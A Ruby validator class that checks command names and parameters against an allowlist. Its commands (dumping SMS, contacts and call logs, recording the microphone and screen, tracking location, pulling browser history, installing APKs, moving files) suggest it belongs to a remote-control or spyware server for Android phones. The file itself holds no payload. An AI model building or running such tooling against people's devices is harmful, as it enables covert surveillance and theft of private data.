# frozen_string_literal: true

class CommandValidator
  ALLOWED_COMMANDS = %w[
    send_sms get_sms get_device_info start_camera stop_camera
    get_wifi_info get_localtime uninstall_app install_apk
    launch_app get_installed_apps get_contacts take_picture
    screen_record get_location get_call_logs get_browser_history
    toggle_wifi set_audio_mode get_notifications
    list_files download_file upload_file delete_file preview_file
    rename_file move_file search_files upload_file_chunk
    take_screenshot location mic_record camera_capture
    dump_contacts dump_sms dump_calllogs
  ].freeze

  AUDIO_MODES = %w[normal vibrate silent].freeze
  CAMERA_IDS = %w[0 1].freeze

  PARAM_RULES = {
    'send_sms' => { required: %i[phone_number message_body] },
    'uninstall_app' => { required: %i[package_name] },
    'launch_app' => { required: %i[package_name] },
    'install_apk' => { required: %i[apk_path] },
    'start_camera' => { optional: %i[camera_id] },
    'set_audio_mode' => { required: %i[mode] },
    'download_file' => { required: %i[path] },
    'delete_file' => { required: %i[path] },
    'rename_file' => { required: %i[path new_name] },
    'move_file' => { required: %i[path destination] },
    'search_files' => { required: %i[query] }
  }.freeze

  Result = Struct.new(:valid?, :value, :error, keyword_init: true)

  def self.validate(command, params = {})
    new.validate(command, params)
  end

  def validate(command, params = {})
    cmd = command.to_s.strip

    return failure("Command is required") if cmd.empty?
    return failure("Command '#{cmd}' is not allowed") unless ALLOWED_COMMANDS.include?(cmd)

    rules = PARAM_RULES[cmd]
    if rules && rules[:required]
      missing = rules[:required].select { |p| params[p].nil? && params[p.to_s].nil? }
      return failure("Missing required params for '#{cmd}': #{missing.join(', ')}") if missing.any?
    end

    if cmd == 'set_audio_mode'
      mode = (params[:mode] || params['mode']).to_s
      return failure("Invalid audio mode: #{mode}") unless AUDIO_MODES.include?(mode)
    end

    success(cmd)
  end

  def self.allowed?(command)
    ALLOWED_COMMANDS.include?(command.to_s.strip)
  end

  private

  def success(value)
    Result.new(valid?: true, value: value, error: nil)
  end

  def failure(error)
    Result.new(valid?: false, value: nil, error: error)
  end
end
